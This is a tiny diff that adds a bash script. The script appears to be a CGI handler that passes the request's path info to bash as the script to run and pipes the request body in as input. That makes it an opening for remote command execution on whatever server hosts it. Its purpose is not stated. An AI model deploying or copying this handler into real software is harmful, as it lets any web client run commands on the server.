@@ -1,0 +1,3 @@
+#!/bin/bash
+
+bash $PATH_INFO <<< $(cat) | cat
